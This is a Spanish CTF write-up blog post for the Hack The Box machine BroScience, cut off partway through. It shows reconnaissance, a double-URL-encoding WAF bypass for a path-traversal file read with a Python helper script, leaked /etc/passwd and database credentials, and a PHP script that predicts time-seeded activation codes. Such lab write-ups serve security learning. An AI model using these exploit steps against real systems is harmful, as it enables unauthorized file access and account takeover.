@@ -1,0 +1,549 @@
+<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="BroScience Writeup" /><meta name="author" content="Miguel3023" /><meta property="og:locale" content="es_ES" /><meta name="description" content="En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la base de datos para ver credenciales, crackear contraseñas y conectarnos por ssh. Por último abusaremos de un script que se está ejecutando a intervalos regulares de tiempo." /><meta property="og:description" content="En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la base de datos para ver credenciales, crackear contraseñas y conectarnos por ssh. Por último abusaremos de un script que se está ejecutando a intervalos regulares de tiempo." /><link rel="canonical" href="/posts/writeup-broscience/" /><meta property="og:url" content="/posts/writeup-broscience/" /><meta property="og:site_name" content="Miguel3023" /><meta property="og:image" content="/assets/img/commons/Broscience/BroScience.png" /><meta property="og:image:height" content="450" /><meta property="og:image:width" content="800" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-09T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/commons/Broscience/BroScience.png" /><meta property="twitter:title" content="BroScience Writeup" /><meta name="twitter:site" content="@AngelMiguel3023" /><meta name="twitter:creator" content="@AngelMiguel3023" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel3023","url":"https://miguel3023.github.io"},"dateModified":"2023-01-09T21:14:01-05:00","datePublished":"2023-01-09T00:00:00-05:00","description":"En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la base de datos para ver credenciales, crackear contraseñas y conectarnos por ssh. Por último abusaremos de un script que se está ejecutando a intervalos regulares de tiempo.","headline":"BroScience Writeup","image":{"width":800,"height":450,"url":"/assets/img/commons/Broscience/BroScience.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"/posts/writeup-broscience/"},"url":"/posts/writeup-broscience/"}</script><title>BroScience Writeup | Miguel3023</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Miguel3023"><meta name="application-name" content="Miguel3023"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/sr.integra.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Miguel3023</a></div><div class="site-subtitle font-italic">CTF Player | Cybersecurity enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE MÍ</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/miguel3023" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/AngelMiguel3023" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://app.hackthebox.com/profile/907376" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/miguel-malag%C3%B3n-8547301b0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>BroScience Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>BroScience Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1673240400" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 09/01/2023 </em> </span> <span> Actualizado <em class="" data-ts="1673316841" data-df="DD/MM/YYYY" data-toggle="tooltip" data-placement="bottom"> 09/01/2023 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 450'%3E%3C/svg%3E" data-src="../../assets/img/commons/Broscience/BroScience.png" class="preview-img bg" alt="Preview Image" width="800" height="450" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> Por <em> <a href="https://miguel3023.github.io">Miguel3023</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1997 palabras"> <em>11 min</em> de lectura</span></div></div></div><div class="post-content"><p>En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la base de datos para ver credenciales, crackear contraseñas y conectarnos por ssh. Por último abusaremos de un script que se está ejecutando a intervalos regulares de tiempo.</p><p>Primeramente ejecutamos un escaneo con nmap</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.95.77 -oG OpenPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Scanning 10.129.95.77 [65535 ports]
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</pre></table></code></div></div><p>Vemos el puerto 80 y 443 abiertos, ahora lanzamos un whatweb para ver las tecnologías que se emplean en el puerto 80</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ whatweb http://10.129.95.77
+http://10.129.95.77 [301 Moved Permanently] Apache[2.4.54], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.95.77], RedirectLocation[https://broscience.htb/], Title[301 Moved Permanently]
+https://broscience.htb/ [200 OK] Apache[2.4.54], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.95.77], Script, Title[BroScience : Home]
+</pre></table></code></div></div><p>Vemos que hace un redirect a “broscience.htb”, lo añadimos al “/etc/hosts”. Si nos dirigimos a la web nos redirige hacia el “https” con el certificado SSL autofirmado.</p><p>Ahora escaneamos con nmap para ver la versión de los servicios que hay en los puertos abiertos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>❯ nmap -sCV -p22,80,443 10.129.95.77 -oN services
+Nmap scan report for broscience.htb (10.129.95.77)
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
+|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
+|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.54
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: Did not follow redirect to https://broscience.htb/
+443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
+| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
+| Not valid before: 2022-07-14T19:48:36
+|_Not valid after:  2023-07-14T19:48:36
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: BroScience : Home
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| tls-alpn: 
+|_  http/1.1
+</pre></table></code></div></div><p>Fuzzeamos con <strong>Wfuzz</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>❯ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://broscience.htb/FUZZ
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload      
+=====================================================================
+
+000000014:   200        146 L    510 W      9308 Ch     "https://broscience.htb/"
+000000016:   301        9 L      28 W       319 Ch      "images"                 
+000000638:   301        9 L      28 W       321 Ch      "includes"               
+000000730:   301        9 L      28 W       319 Ch      "manual"                 
+000001073:   301        9 L      28 W       323 Ch      "javascript"             
+000001717:   301        9 L      28 W       319 Ch      "styles"
+</pre></table></code></div></div><p>Vemos un “/includes” y dentro un “img.php”, y cuando entramos vemos que nos dice <strong>Error: Missing ‘path’ parameter.</strong> Es decir, hay un parámetro “path”, lo usamos a ver qué</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ curl -k 'https://broscience.htb/includes/img.php?path=../../../../../etc/passwd'
+&lt;b&gt;Error:&lt;/b&gt; Attack detected.
+</pre></table></code></div></div><p>Vemos que detecta un ataque si intentamos un LFI, pero se puede bypassear con doble urlencode, para ello me haré un script de python</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">pdb</span>
+
+<span class="n">injection</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Qué archivo quieres visualizar? "</span><span class="p">)</span>
+
+<span class="n">injection</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">injection</span><span class="p">)</span>
+
+<span class="n">injection</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">injection</span><span class="p">)</span> 
+
+<span class="n">command</span> <span class="o">=</span> <span class="s">"curl -k 'https://broscience.htb/includes/img.php?path="</span> <span class="o">+</span> <span class="n">injection</span> <span class="o">+</span> <span class="s">"'"</span>
+
+
+
+<span class="n">execute</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">execute</span><span class="p">)</span>
+</pre></table></code></div></div><p>Ahora para visualizar un fichero simplemente lo introducimos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>❯ ./lfi.py
+Qué archivo quieres visualizar? ../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</pre></table></code></div></div><p>Ahora podemos visualizar el archivo de “db_connect.php” que hay en includes</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre>❯ ./lfi.py
+Qué archivo quieres visualizar? ../includes/db_connect.php
+<span class="cp">&lt;?php</span>
+<span class="nv">$db_host</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$db_port</span> <span class="o">=</span> <span class="s2">"5432"</span><span class="p">;</span>
+<span class="nv">$db_name</span> <span class="o">=</span> <span class="s2">"broscience"</span><span class="p">;</span>
+<span class="nv">$db_user</span> <span class="o">=</span> <span class="s2">"dbuser"</span><span class="p">;</span>
+<span class="nv">$db_pass</span> <span class="o">=</span> <span class="s2">"RangeOfMotion%777"</span><span class="p">;</span>
+<span class="nv">$db_salt</span> <span class="o">=</span> <span class="s2">"NaCl"</span><span class="p">;</span>
+
+<span class="nv">$db_conn</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">"host=</span><span class="si">{</span><span class="nv">$db_host</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$db_port</span><span class="si">}</span><span class="s2"> dbname=</span><span class="si">{</span><span class="nv">$db_name</span><span class="si">}</span><span class="s2"> user=</span><span class="si">{</span><span class="nv">$db_user</span><span class="si">}</span><span class="s2"> password=</span><span class="si">{</span><span class="nv">$db_pass</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$db_conn</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>Ya tenemos las credenciales de la base de datos pero por ahora eso no nos interesa. Visualizamos el “utils.php” y lo guardamos en un fichero</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ ./lfi.py &gt; utils.php
+../includes/utils.php
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3060  100  3060    0     0   4533      0 --:--:-- --:--:-- --:--:--  4526
+</pre></table></code></div></div><p>Ahora viendo el código, podemos ver cómo se genera el código de activación cuando intentamos crear un usuario</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="n">generate_activation_code</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nv">$chars</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;</span>
+    <span class="nb">srand</span><span class="p">(</span><span class="nb">time</span><span class="p">());</span>
+    <span class="nv">$activation_code</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$activation_code</span> <span class="o">=</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$activation_code</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>También podemos ver un archivo “activate.php”, si lo guardamos y lo visualizamos podemos ver que nos manda a un link cuando genera el código de activación</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>❯ cat register.php | grep "activate"
+ 
+ $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
+
+</pre></table></code></div></div><p>Vemos que genera un código de 32 dígitos y en base a la hora del sistema cuando tramitamos la petición de creación de usuario. Esto gracias a la función “srand” que funciona como semilla de hora. Creamos un usuario e interceptamos la petición con burpsuite y para el script de php copiamos la fecha que nos da el servidor y la ponemos en el script. Ahora con un script de php podemos intentar fuzzear por los códigos aleatorios que nos genera el script</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="n">generate_activation_code</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$chars</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;</span>
+    <span class="nb">srand</span><span class="p">(</span><span class="nv">$time</span><span class="p">);</span>
+    <span class="nv">$activation_code</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$activation_code</span> <span class="o">=</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$activation_code</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$ref_time</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"U"</span><span class="p">,</span><span class="nb">strtotime</span><span class="p">(</span><span class="s1">'Mon, 09 Jan 2023 23:32:24 GMT'</span><span class="p">));</span>
+<span class="k">for</span> <span class="p">(</span><span class="nv">$t</span> <span class="o">=</span> <span class="nv">$ref_time</span> <span class="o">-</span> <span class="mi">500</span><span class="p">;</span> <span class="nv">$t</span> <span class="o">&lt;=</span> <span class="nv">$ref_time</span> <span class="o">+</span> <span class="mi">500</span><span class="p">;</span> <span class="nv">$t</span><span class="o">++</span><span class="p">)</span>
+    <span class="k">echo</span> <span class="nf">generate_activation_code</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
